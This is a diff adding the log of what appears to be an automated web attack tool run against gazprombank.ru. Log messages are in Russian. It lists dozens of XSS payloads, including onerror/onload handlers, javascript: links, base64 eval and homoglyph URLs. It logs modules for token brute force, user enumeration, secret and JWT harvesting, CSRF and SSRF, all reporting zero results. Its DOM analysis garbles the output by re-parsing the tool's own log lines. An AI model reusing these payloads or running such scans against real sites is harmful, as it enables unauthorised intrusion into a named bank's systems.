@@ -1,0 +1,278 @@
+[07:40:17] ℹ️ 🔁 "><svg/onload=https://gazprombank.ru/>
+[07:40:17] ℹ️ 🔁 </script><svg/onload=alert(1)>
+[07:40:17] ℹ️ 🔁 '><img src=x onerror=alert(1)>
+[07:40:17] ℹ️ 🔁 window.name='<img src=x onerror=alert(1)>'
+[07:40:17] ℹ️ 🔁 &#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#103;&#97;&#122;&#112;&#114;&#111;&#109;&#98;&#97;&#110;&#107;&#46;&#114;&#117;&#47;
+[07:40:17] ℹ️ 🔁 setTimeout(`alert(1)`)
+[07:40:17] ℹ️ 🔁 ");https://gazprombank.ru///
+[07:40:17] ℹ️ 🔁 <iframe srcdoc="<script>alert(1)</script>"></iframe>
+[07:40:17] ℹ️ 🔁 https%253A//gazprombank.ru/
+[07:40:17] ℹ️ 🔁 <?xml version='1.0'?><root>https://gazprombank.ru/</root>
+[07:40:17] ℹ️ 🔁 </style>https://gazprombank.ru/<style>
+[07:40:17] ℹ️ 🔁 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//
+[07:40:17] ℹ️ 🔁 <style>@import 'javascript:alert(1)';</style>
+[07:40:17] ℹ️ 🔁 <img src=x onerror=alert(1)>
+[07:40:17] ℹ️ 🔁 ‮https://gazprombank.ru/
+[07:40:17] ℹ️ 🔁 <a href="javascript:https://gazprombank.ru/">click</a>
+[07:40:17] ℹ️ 🔁 HttPS://gAZprOmbanK.Ru/
+[07:40:17] ℹ️ 🔁 /*x*/https://gazprombank.ru//*y*/
+[07:40:17] ℹ️ 🔁 <script src=data:text/javascript,alert(1)></script>
+[07:40:17] ℹ️ 🔁 data:text/html,<script>alert(1)</script>
+[07:40:17] ℹ️ 🔁 HttpS://GazPrOmbANK.ru/
+[07:40:17] ℹ️ 🔁 <svg><desc><![CDATA[https://gazprombank.ru/]]></desc></svg>
+[07:40:17] ℹ️ 🔁 <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+[07:40:17] ℹ️ 🔁 https%3A//gazprombank.ru/LFlSS
+[07:40:17] ℹ️ 🔁 <math><mtext>https://gazprombank.ru/</mtext></math>
+[07:40:17] ℹ️ 🔁 https%3A//gazprombank.ru/
+[07:40:17] ℹ️ 🔁 Function('alert(1)')()
+[07:40:17] ℹ️ 🔁 " onmouseover=https://gazprombank.ru/ x="
+[07:40:17] ℹ️ 🔁 location='javascript:alert(1)'
+[07:40:17] ℹ️ 🔁 https://gazprombank.ru/
+[07:40:17] ℹ️ 🔁 " autofocus onfocus=https://gazprombank.ru/ x="
+[07:40:17] ℹ️ 🔁 <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+[07:40:17] ℹ️ 🔁 /*jsfuck*/eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))
+[07:40:17] ℹ️ 🔁 <!--xss-start-->https://gazprombank.ru/<!--xss-end-->
+[07:40:17] ℹ️ 🔁 <iframe srcdoc="https://gazprombank.ru/">
+[07:40:17] ℹ️ 🔁 ";alert(1);//
+[07:40:17] ℹ️ 🔁 "};alert(1);//
+[07:40:17] ℹ️ 🔁 {"x":"https://gazprombank.ru/"}
+[07:40:17] ℹ️ 🔁 <img src=x onerror=eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))>
+[07:40:17] ℹ️ 🔁 javascript:https://gazprombank.ru/
+[07:40:17] ℹ️ 🔁 <link rel="stylesheet" href="data:text/css,body{background:red}">
+[07:40:17] ℹ️ 🔁 һttрs://gаzрrоmbаnк.ru/
+[07:40:17] ℹ️ 🔁 <body onload="https://gazprombank.ru/">
+[07:40:17] ℹ️ 🔁 <script>eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))</script>
+[07:40:25] ℹ️ [07:40:25] ✔️ AttackEngine: атака по найденным точкам завершена (0 результатов).
+[07:40:31] ℹ️ [07:40:31] ✔️ AttackEngine: DOM-вектора проверены (0 потенциальных точек).
+[07:40:31] ℹ️ ✔️ DOM-атака завершена за 0.01 сек.
+[07:40:35] ℹ️ [07:40:35] 🧨 Запуск автоатаки...
+[07:40:35] ℹ️ [07:40:35] ✔️ Автоатака завершена за 0ms.
+[07:40:35] ℹ️ [07:40:35] 🧪 Modular AutoAttack 6.2 запущен...
+[07:40:35] ℹ️ [07:40:35] 🍪 Загружено 1 cookies из session.json
+[07:40:35] ℹ️ [07:40:35] ▶️ API Endpoints...
+[07:40:35] ❌ [07:40:35] ❌ Ошибка в модуле API Endpoints: attack_api_endpoints() missing 1 required positional argument: 'log_func'
+[07:40:35] ℹ️ [07:40:35] ▶️ Token Brute Force...
+[07:40:35] ℹ️ [07:40:35] ▶️ Parameters Discovery...
+[07:40:35] ❌ [07:40:35] ❌ Ошибка в модуле Parameters Discovery: attack_parameters() missing 1 required positional argument: 'log_func'
+[07:40:35] ℹ️ [07:40:35] ▶️ User IDs Enumeration...
+[07:40:35] ℹ️ [07:40:35] ▶️ XSS Targets...
+[07:40:35] ℹ️ [07:40:35] ▶️ GraphQL Endpoints...
+[07:40:35] ℹ️ [07:40:35] ▶️ JS Sensitive Analysis...
+[07:40:35] ℹ️ [07:40:35] 🔷 JS Endpoint Attacks...
+[07:40:35] ℹ️ [07:40:35] 🔍 Запуск атак по найденным JS-эндпоинтам...
+[07:40:35] ℹ️ [07:40:35] 🔷 DOM Vector Attacks...
+[07:40:35] ℹ️ [07:40:35] 🚀 DOM атака началась...
+[07:40:35] ℹ️ [07:40:35] ▶️ Security Headers Review...
+[07:40:35] ℹ️ [07:40:35] ▶️ CSP Weakness Scan...
+[07:40:35] ℹ️ [07:40:35] ▶️ Secrets & Keys...
+[07:40:35] ℹ️ [07:40:35] ▶️ JWT Tokens...
+[07:40:35] ℹ️ [07:40:35] ▶️ Forms & Inputs...
+[07:40:35] ℹ️ [07:40:35] ▶️ Error Pages & Stacktraces...
+[07:40:35] ℹ️ [07:40:35] ▶️ CSRF Actions...
+[07:40:35] ℹ️ [07:40:35] ▶️ SSRF Scan...
+[07:40:35] ℹ️ [07:40:35] ✅ Modular AutoAttack завершён.
+[07:40:54] ℹ️ 📜 Полный DOM-анализ:
+[07:40:54] ℹ️ {
+  "forms": [],
+  "iframes": [
+    {
+      "src": "",
+      "sandbox": ""
+    },
+    {
+      "src": "",
+      "sandbox": ""
+    }
+  ],
+  "meta_tags": [
+    {
+      "name": "refresh",
+      "content": "0;url=javascript:alert(1)"
+    }
+  ],
+  "dom_events": [
+    {
+      "tag": "svg",
+      "event": "onload",
+      "handler": "https://gazprombank.ru/",
+      "risk_level": "⚠️ Высокий"
+    },
+    {
+      "tag": "svg",
+      "event": "onload",
+      "handler": "alert(1)",
+      "risk_level": "⚠️ Высокий"
+    },
+    {
+      "tag": "img",
+      "event": "onerror",
+      "handler": "alert(1)",
+      "risk_level": "⚠️ Высокий"
+    },
+    {
+      "tag": "img",
+      "event": "onerror",
+      "handler": "alert(1)",
+      "risk_level": "⚠️ Высокий"
+    },
+    {
+      "tag": "img",
+      "event": "onerror",
+      "handler": "alert(1)",
+      "risk_level": "⚠️ Высокий"
+    },
+    {
+      "tag": "img",
+      "event": "onerror",
+      "handler": "eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))",
+      "risk_level": "⚠️ Высокий"
+    },
+    {
+      "tag": "body",
+      "event": "onload",
+      "handler": "https://gazprombank.ru/",
+      "risk_level": "⚠️ Высокий"
+    }
+  ],
+  "scripts": [
+    {
+      "src": "data:text/javascript,alert(1)",
+      "type": "text/javascript",
+      "inline": "",
+      "async": false,
+      "defer": false
+    },
+    {
+      "src": "",
+      "type": "text/javascript",
+      "inline": "alert(1)",
+      "async": false,
+      "defer": false
+    },
+    {
+      "src": "",
+      "type": "text/javascript",
+      "inline": "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
+      "async": false,
+      "defer": false
+    },
+    {
+      "src": "",
+      "type": "text/javascript",
+      "inline": "eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))",
+      "async": false,
+      "defer": false
+    }
+  ],
+  "inline_js": [
+    "alert(1)",
+    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
+    "eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))"
+  ],
+  "links": [
+    {
+      "href": "javascript:https://gazprombank.ru/",
+      "text": "click"
+    }
+  ],
+  "styles": [
+    {
+      "inline_css": "[07:40:17] ℹ️ 🔁 jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//\n[07:40:17] ℹ️ 🔁 <style>@import 'javascript:alert(1)';"
+    },
+    {
+      "href": "data:text/css,body{background:red}",
+      "media": ""
+    }
+  ],
+  "comments": [
+    "xss-start",
+    "xss-end"
+  ],
+  "noscript": [],
+  "csp_meta": [],
+  "base_tag": {},
+  "data_attributes": [],
+  "aria_attributes": [],
+  "svg": [
+    {
+      "svg": "<svg onload=\"https://gazprombank.ru/\">\n[07:40:17] ℹ️ 🔁 <svg onload=\"alert(1)\">\n[07:40:17] ℹ️ 🔁 '&gt;<img onerror=\"alert(1)\" src=\"x\"/>\n[07:40:17] ℹ️ 🔁 window.name='<img onerror=\"alert(1)\" src=\"x\"/>'\n[07:40:17] ℹ️ 🔁 https://gazprombank.ru/\n[07:40:17] ℹ️ 🔁 setTimeout(`alert(1)`)\n[07:40:17] ℹ️ 🔁 \");https://gazprombank.ru///\n[07:40:17] ℹ️ 🔁 <iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>\n[07:40:17] ℹ️ 🔁 https%253A//gazprombank.ru/\n[07:40:17] ℹ️ 🔁 <?xml version='1.0'?><root>https://gazprombank.ru/</root>\n[07:40:17] ℹ️ 🔁 https://gazprombank.ru/<style>\n[07:40:17] ℹ️ 🔁 jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//\n[07:40:17] ℹ️ 🔁 <style>@import 'javascript:alert(1)';</style>\n[07:40:17] ℹ️ 🔁 <img onerror=\"alert(1)\" src=\"x\"/>\n[07:40:17] ℹ️ 🔁 ‮https://gazprombank.ru/\n[07:40:17] ℹ️ 🔁 <a href=\"javascript:https://gazprombank.ru/\">click</a>\n[07:40:17] ℹ️ 🔁 HttPS://gAZprOmbanK.Ru/\n[07:40:17] ℹ️ 🔁 /*x*/https://gazprombank.ru//*y*/\n[07:40:17] ℹ️ 🔁 <script src=\"data:text/javascript,alert(1)\"></script>\n[07:40:17] ℹ️ 🔁 data:text/html,<script>alert(1)</script>\n[07:40:17] ℹ️ 🔁 HttpS://GazPrOmbANK.ru/\n[07:40:17] ℹ️ 🔁 <svg><desc><![CDATA[https://gazprombank.ru/]]></desc></svg>\n[07:40:17] ℹ️ 🔁 <meta content=\"0;url=javascript:alert(1)\" http-equiv=\"refresh\"/>\n[07:40:17] ℹ️ 🔁 https%3A//gazprombank.ru/LFlSS\n[07:40:17] ℹ️ 🔁 <math><mtext>https://gazprombank.ru/</mtext></math>\n[07:40:17] ℹ️ 🔁 https%3A//gazprombank.ru/\n[07:40:17] ℹ️ 🔁 Function('alert(1)')()\n[07:40:17] ℹ️ 🔁 \" onmouseover=https://gazprombank.ru/ x=\"\n[07:40:17] ℹ️ 🔁 location='javascript:alert(1)'\n[07:40:17] ℹ️ 🔁 https://gazprombank.ru/\n[07:40:17] ℹ️ 🔁 \" autofocus onfocus=https://gazprombank.ru/ x=\"\n[07:40:17] ℹ️ 🔁 <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>\n[07:40:17] ℹ️ 🔁 /*jsfuck*/eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))\n[07:40:17] ℹ️ 🔁 <!--xss-start-->https://gazprombank.ru/<!--xss-end-->\n[07:40:17] ℹ️ 🔁 <iframe srcdoc=\"https://gazprombank.ru/\">\n[07:40:17] ℹ️ 🔁 \";alert(1);//\n[07:40:17] ℹ️ 🔁 \"};alert(1);//\n[07:40:17] ℹ️ 🔁 {\"x\":\"https://gazprombank.ru/\"}\n[07:40:17] ℹ️ 🔁 <img onerror=\"eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))\" src=\"x\"/>\n[07:40:17] ℹ️ 🔁 javascript:https://gazprombank.ru/\n[07:40:17] ℹ️ 🔁 <link href=\"data:text/css,body{background:red}\" rel=\"stylesheet\"/>\n[07:40:17] ℹ️ 🔁 һttрs://gаzрrоmbаnк.ru/\n[07:40:17] ℹ️ 🔁 <body onload=\"https://gazprombank.ru/\">\n[07:40:17] ℹ️ 🔁 <script>eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))</script>\n[07:40:25] ℹ️ [07:40:25] ✔️ AttackEngine: атака по найденным точкам завершена (0 результатов).\n[07:40:31] ℹ️ [07:40:31] ✔️ AttackEngine: DOM-вектора проверены (0 потенциальных точек).\n[07:40:31] ℹ️ ✔️ DOM-атака завершена за 0.01 сек.\n[07:40:35] ℹ️ [07:40:35] 🧨 Запуск автоатаки...\n[07:40:35] ℹ️ [07:40:35] ✔️ Автоатака завершена за 0ms.\n[07:40:35] ℹ️ [07:40:35] 🧪 Modular AutoAttack 6.2 запущен...\n[07:40:35] ℹ️ [07:40:35] 🍪 Загружено 1 cookies из session.json\n[07:40:35] ℹ️ [07:40:35] ▶️ API Endpoints...\n[07:40:35] ❌ [07:40:35] ❌ Ошибка в модуле API Endpoints: attack_api_endpoints() missing 1 required positional argument: 'log_func'\n[07:40:35] ℹ️ [07:40:35] ▶️ Token Brute Force...\n[07:40:35] ℹ️ [07:40:35] ▶️ Parameters Discovery...\n[07:40:35] ❌ [07:40:35] ❌ Ошибка в модуле Parameters Discovery: attack_parameters() missing 1 required positional argument: 'log_func'\n[07:40:35] ℹ️ [07:40:35] ▶️ User IDs Enumeration...\n[07:40:35] ℹ️ [07:40:35] ▶️ XSS Targets...\n[07:40:35] ℹ️ [07:40:35] ▶️ GraphQL Endpoints...\n[07:40:35] ℹ️ [07:40:35] ▶️ JS Sensitive Analysis...\n[07:40:35] ℹ️ [07:40:35] 🔷 JS Endpoint Attacks...\n[07:40:35] ℹ️ [07:40:35] 🔍 Запуск атак по найденным JS-эндпоинтам...\n[07:40:35] ℹ️ [07:40:35] 🔷 DOM Vector Attacks...\n[07:40:35] ℹ️ [07:40:35] 🚀 DOM атака началась...\n[07:40:35] ℹ️ [07:40:35] ▶️ Security Headers Review...\n[07:40:35] ℹ️ [07:40:35] ▶️ CSP Weakness Scan...\n[07:40:35] ℹ️ [07:40:35] ▶️ Secrets &amp; Keys...\n[07:40:35] ℹ️ [07:40:35] ▶️ JWT Tokens...\n[07:40:35] ℹ️ [07:40:35] ▶️ Forms &amp; Inputs...\n[07:40:35] ℹ️ [07:40:35] ▶️ Error Pages &amp; Stacktraces...\n[07:40:35] ℹ️ [07:40:35] ▶️ CSRF Actions...\n[07:40:35] ℹ️ [07:40:35] ▶️ SSRF Scan...\n[07:40:35] ℹ️ [07:40:35] ✅ Modular AutoAttack завершён.</body></iframe></svg></svg>"
+    },
+    {
+      "svg": "<svg onload=\"alert(1)\">\n[07:40:17] ℹ️ 🔁 '&gt;<img onerror=\"alert(1)\" src=\"x\"/>\n[07:40:17] ℹ️ 🔁 window.name='<img onerror=\"alert(1)\" src=\"x\"/>'\n[07:40:17] ℹ️ 🔁 https://gazprombank.ru/\n[07:40:17] ℹ️ 🔁 setTimeout(`alert(1)`)\n[07:40:17] ℹ️ 🔁 \");https://gazprombank.ru///\n[07:40:17] ℹ️ 🔁 <iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>\n[07:40:17] ℹ️ 🔁 https%253A//gazprombank.ru/\n[07:40:17] ℹ️ 🔁 <?xml version='1.0'?><root>https://gazprombank.ru/</root>\n[07:40:17] ℹ️ 🔁 https://gazprombank.ru/<style>\n[07:40:17] ℹ️ 🔁 jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//\n[07:40:17] ℹ️ 🔁 <style>@import 'javascript:alert(1)';</style>\n[07:40:17] ℹ️ 🔁 <img onerror=\"alert(1)\" src=\"x\"/>\n[07:40:17] ℹ️ 🔁 ‮https://gazprombank.ru/\n[07:40:17] ℹ️ 🔁 <a href=\"javascript:https://gazprombank.ru/\">click</a>\n[07:40:17] ℹ️ 🔁 HttPS://gAZprOmbanK.Ru/\n[07:40:17] ℹ️ 🔁 /*x*/https://gazprombank.ru//*y*/\n[07:40:17] ℹ️ 🔁 <script src=\"data:text/javascript,alert(1)\"></script>\n[07:40:17] ℹ️ 🔁 data:text/html,<script>alert(1)</script>\n[07:40:17] ℹ️ 🔁 HttpS://GazPrOmbANK.ru/\n[07:40:17] ℹ️ 🔁 <svg><desc><![CDATA[https://gazprombank.ru/]]></desc></svg>\n[07:40:17] ℹ️ 🔁 <meta content=\"0;url=javascript:alert(1)\" http-equiv=\"refresh\"/>\n[07:40:17] ℹ️ 🔁 https%3A//gazprombank.ru/LFlSS\n[07:40:17] ℹ️ 🔁 <math><mtext>https://gazprombank.ru/</mtext></math>\n[07:40:17] ℹ️ 🔁 https%3A//gazprombank.ru/\n[07:40:17] ℹ️ 🔁 Function('alert(1)')()\n[07:40:17] ℹ️ 🔁 \" onmouseover=https://gazprombank.ru/ x=\"\n[07:40:17] ℹ️ 🔁 location='javascript:alert(1)'\n[07:40:17] ℹ️ 🔁 https://gazprombank.ru/\n[07:40:17] ℹ️ 🔁 \" autofocus onfocus=https://gazprombank.ru/ x=\"\n[07:40:17] ℹ️ 🔁 <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>\n[07:40:17] ℹ️ 🔁 /*jsfuck*/eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))\n[07:40:17] ℹ️ 🔁 <!--xss-start-->https://gazprombank.ru/<!--xss-end-->\n[07:40:17] ℹ️ 🔁 <iframe srcdoc=\"https://gazprombank.ru/\">\n[07:40:17] ℹ️ 🔁 \";alert(1);//\n[07:40:17] ℹ️ 🔁 \"};alert(1);//\n[07:40:17] ℹ️ 🔁 {\"x\":\"https://gazprombank.ru/\"}\n[07:40:17] ℹ️ 🔁 <img onerror=\"eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))\" src=\"x\"/>\n[07:40:17] ℹ️ 🔁 javascript:https://gazprombank.ru/\n[07:40:17] ℹ️ 🔁 <link href=\"data:text/css,body{background:red}\" rel=\"stylesheet\"/>\n[07:40:17] ℹ️ 🔁 һttрs://gаzрrоmbаnк.ru/\n[07:40:17] ℹ️ 🔁 <body onload=\"https://gazprombank.ru/\">\n[07:40:17] ℹ️ 🔁 <script>eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))</script>\n[07:40:25] ℹ️ [07:40:25] ✔️ AttackEngine: атака по найденным точкам завершена (0 результатов).\n[07:40:31] ℹ️ [07:40:31] ✔️ AttackEngine: DOM-вектора проверены (0 потенциальных точек).\n[07:40:31] ℹ️ ✔️ DOM-атака завершена за 0.01 сек.\n[07:40:35] ℹ️ [07:40:35] 🧨 Запуск автоатаки...\n[07:40:35] ℹ️ [07:40:35] ✔️ Автоатака завершена за 0ms.\n[07:40:35] ℹ️ [07:40:35] 🧪 Modular AutoAttack 6.2 запущен...\n[07:40:35] ℹ️ [07:40:35] 🍪 Загружено 1 cookies из session.json\n[07:40:35] ℹ️ [07:40:35] ▶️ API Endpoints...\n[07:40:35] ❌ [07:40:35] ❌ Ошибка в модуле API Endpoints: attack_api_endpoints() missing 1 required positional argument: 'log_func'\n[07:40:35] ℹ️ [07:40:35] ▶️ Token Brute Force...\n[07:40:35] ℹ️ [07:40:35] ▶️ Parameters Discovery...\n[07:40:35] ❌ [07:40:35] ❌ Ошибка в модуле Parameters Discovery: attack_parameters() missing 1 required positional argument: 'log_func'\n[07:40:35] ℹ️ [07:40:35] ▶️ User IDs Enumeration...\n[07:40:35] ℹ️ [07:40:35] ▶️ XSS Targets...\n[07:40:35] ℹ️ [07:40:35] ▶️ GraphQL Endpoints...\n[07:40:35] ℹ️ [07:40:35] ▶️ JS Sensitive Analysis...\n[07:40:35] ℹ️ [07:40:35] 🔷 JS Endpoint Attacks...\n[07:40:35] ℹ️ [07:40:35] 🔍 Запуск атак по найденным JS-эндпоинтам...\n[07:40:35] ℹ️ [07:40:35] 🔷 DOM Vector Attacks...\n[07:40:35] ℹ️ [07:40:35] 🚀 DOM атака началась...\n[07:40:35] ℹ️ [07:40:35] ▶️ Security Headers Review...\n[07:40:35] ℹ️ [07:40:35] ▶️ CSP Weakness Scan...\n[07:40:35] ℹ️ [07:40:35] ▶️ Secrets &amp; Keys...\n[07:40:35] ℹ️ [07:40:35] ▶️ JWT Tokens...\n[07:40:35] ℹ️ [07:40:35] ▶️ Forms &amp; Inputs...\n[07:40:35] ℹ️ [07:40:35] ▶️ Error Pages &amp; Stacktraces...\n[07:40:35] ℹ️ [07:40:35] ▶️ CSRF Actions...\n[07:40:35] ℹ️ [07:40:35] ▶️ SSRF Scan...\n[07:40:35] ℹ️ [07:40:35] ✅ Modular AutoAttack завершён.</body></iframe></svg>"
+    },
+    {
+      "svg": "<svg><desc><![CDATA[https://gazprombank.ru/]]></desc></svg>"
+    }
+  ],
+  "tables": [],
+  "media": [
+    {
+      "tag": "img",
+      "src": "x",
+      "alt": ""
+    },
+    {
+      "tag": "img",
+      "src": "x",
+      "alt": ""
+    },
+    {
+      "tag": "img",
+      "src": "x",
+      "alt": ""
+    },
+    {
+      "tag": "img",
+      "src": "x",
+      "alt": ""
+    }
+  ],
+  "inline_styles": []
+}
+[07:41:33] ℹ️ ⚠️ Потенциальные XSS-векторы:
+[07:41:33] ℹ️ svg onload → ⚠️ Высокий
+[07:41:33] ℹ️ svg onload → ⚠️ Высокий
+[07:41:33] ℹ️ img onerror → ⚠️ Высокий
+[07:41:33] ℹ️ img onerror → ⚠️ Высокий
+[07:41:33] ℹ️ img onerror → ⚠️ Высокий
+[07:41:33] ℹ️ img onerror → ⚠️ Высокий
+[07:41:33] ℹ️ body onload → ⚠️ Высокий
+[07:41:33] ℹ️ img onerror → ⚠️ Высокий
+[07:41:33] ℹ️ img onerror → ⚠️ Высокий
+[07:41:33] ℹ️ body onload → ⚠️ Высокий
+[07:41:33] ℹ️ svg onload → ⚠️ Высокий
+[07:41:33] ℹ️ img onerror → ⚠️ Высокий
+[07:41:33] ℹ️ img onerror → ⚠️ Высокий
+[07:41:33] ℹ️ img onerror → ⚠️ Высокий
+[07:41:33] ℹ️ img onerror → ⚠️ Высокий
+[07:41:33] ℹ️ body onload → ⚠️ Высокий
+[07:41:33] ℹ️ Inline JS:
+[07:41:33] ℹ️ alert(1)...
+[07:41:33] ℹ️ eval(String.fromCharCode(97,108,101,114,116,40,49,41))...
+[07:41:33] ℹ️ eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))...
+[07:41:33] ℹ️ alert(1)...
+[07:41:33] ℹ️ eval(String.fromCharCode(97,108,101,114,116,40,49,41))...
+[07:41:33] ℹ️ eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))...
+[07:41:33] ℹ️ alert(1)...
+[07:41:33] ℹ️ eval(String.fromCharCode(97,108,101,114,116,40,49,41))...
+[07:41:33] ℹ️ eval(atob('aHR0cHM6Ly9nYXpwcm9tYmFuay5ydS8='))...
+[07:41:53] ℹ️ 🔗 Ссылки:
+[07:41:53] ℹ️ click → javascript:https://gazprombank.ru/
+[07:41:53] ℹ️ click → \"javascript:https://gazprombank.ru/\"
+[07:41:53] ℹ️ click → \"javascript:https://gazprombank.ru/\"
+[07:41:58] ℹ️ 🎨 Стили:
+[07:41:58] ℹ️ {'inline_css': '[07:40:17] ℹ️ 🔁 jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(1) )//\n[07:40:17] ℹ️ 🔁 <style>@import \'javascript:alert(1)\';'}
+[07:41:58] ℹ️ {'inline_css': '@import \'javascript:alert(1)\';"\n    },\n    {\n      "href": "data:text/css,body{background:red}",\n      "media": ""\n    }\n  ],\n  "comments": [\n    "xss-start",\n    "xss-end"\n  ],\n  "noscript": [],\n  "csp_meta": [],\n  "base_tag": {},\n  "data_attributes": [],\n  "aria_attributes": [],\n  "svg": [\n    {\n      "svg": "<svg onload=\\"https://gazprombank.ru/\\">\\n[07:40:17] ℹ️ 🔁 <svg onload=\\"alert(1)\\">\\n[07:40:17] ℹ️ 🔁 \'&gt;<img onerror=\\"alert(1)\\" src=\\"x\\"/>\\n[07:40:17] ℹ️ 🔁 window.name=\'<img onerror=\\"alert(1)\\" src=\\"x\\"/>\'\\n[07:40:17] ℹ️ 🔁 https://gazprombank.ru/\\n[07:40:17] ℹ️ 🔁 setTimeout(`alert(1)`)\\n[07:40:17] ℹ️ 🔁 \\");https://gazprombank.ru///\\n[07:40:17] ℹ️ 🔁 <iframe srcdoc=\\"&lt;script&gt;alert(1)&lt;/script&gt;\\"></iframe>\\n[07:40:17] ℹ️ 🔁 https%253A//gazprombank.ru/\\n[07:40:17] ℹ️ 🔁 <?xml version=\'1.0\'?><root>https://gazprombank.ru/</root>\\n[07:40:17] ℹ️ 🔁 https://gazprombank.ru/<style>\\n[07:40:17] ℹ️ 🔁 jaVasCript:/*-/*`/*\\\\`/*\'/*\\"/**/(/* */onerror=alert(1) )//\\n[07:40:17] ℹ️ 🔁 <style>@import \'javascript:alert(1)\';'}
+[07:41:58] ℹ️ {'inline_css': '\\n[07:40:17] ℹ️ 🔁 jaVasCript:/*-/*`/*\\\\`/*\'/*\\"/**/(/* */onerror=alert(1) )//\\n[07:40:17] ℹ️ 🔁 <style>@import \'javascript:alert(1)\';'}
+[07:41:58] ℹ️ {'href': 'data:text/css,body{background:red}', 'media': ''}
+[07:42:03] ℹ️ 🖼️ Медиа:
+[07:42:03] ℹ️ {'tag': 'img', 'src': 'x', 'alt': ''}
+[07:42:03] ℹ️ {'tag': 'img', 'src': 'x', 'alt': ''}
+[07:42:03] ℹ️ {'tag': 'img', 'src': 'x', 'alt': ''}
+[07:42:03] ℹ️ {'tag': 'img', 'src': 'x', 'alt': ''}
+[07:42:03] ℹ️ {'tag': 'img', 'src': '\\"x\\"/', 'alt': ''}
+[07:42:03] ℹ️ {'tag': 'img', 'src': '\\"x\\"/', 'alt': ''}
+[07:42:03] ℹ️ {'tag': 'img', 'src': '\\"x\\"/', 'alt': ''}
+[07:42:03] ℹ️ {'tag': 'img', 'src': '\\"x\\"/', 'alt': ''}
+[07:42:03] ℹ️ {'tag': 'img', 'src': '\\"x\\"/', 'alt': ''}
+[07:42:03] ℹ️ {'tag': 'img', 'src': '\\"x\\"/', 'alt': ''}
